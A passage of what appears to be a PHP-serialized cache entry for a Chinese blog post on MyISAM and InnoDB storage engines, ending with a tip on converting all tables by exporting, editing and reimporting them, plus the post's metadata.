	<span style="color:#666666;font-family:&quot;font-size:14px;background-color:#FFFFFF;">2：如果需要更改所有的表引擎，可以将整张表导出，然后拖进编辑器，进行全部替换即可，然后重新导入进数据库，再重启数据库</span>
</p>
<p style="color:#333333;font-family:微软雅黑, 宋体;font-size:14px;background-color:#FFFFFF;">
	<span style="color:#666666;font-family:&quot;font-size:14px;background-color:#FFFFFF;"><img src="/static/admin/kindeditor/attached/image/20171205/20171205140535_93683.png" alt="" /><br />
</span>
</p>";s:6:"author";s:6:"本站";s:8:"keywords";s:6:"myisam";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:75;s:5:"click";i:102;s:11:"comment_num";i:0;s:11:"description";s:72:"myisam与innodb的区别、相互转换，和性能高低，适应场景";s:5:"ap_id";i:56;s:4:"path";s:20:"/upload/131thumb.png";}}
?>